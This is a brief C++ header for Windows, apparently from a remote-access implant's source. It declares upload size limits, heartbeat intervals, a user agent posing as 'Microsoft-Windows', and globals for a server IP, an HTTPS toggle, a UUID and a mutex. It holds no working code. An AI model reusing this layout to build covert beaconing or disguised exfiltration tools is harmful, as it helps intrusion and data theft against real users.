#pragma once

#include <windows.h>



#define  MAX_UPLOAD_FILESIZE			0X4000000

#define HEART_BEAT_INTERVAL				6000

#define HEART_BEAT_TEST_INTERVAL		1000

#define MY_USERAGENT					L"Microsoft-Windows"

extern "C" DWORD g_ip;

extern "C" DWORD g_httpsToggle;

extern "C" char g_uuid[64];

extern "C" int g_uuid_len;

extern int g_interval;

extern int g_fsize_limit;

extern HANDLE g_mutex_handle ;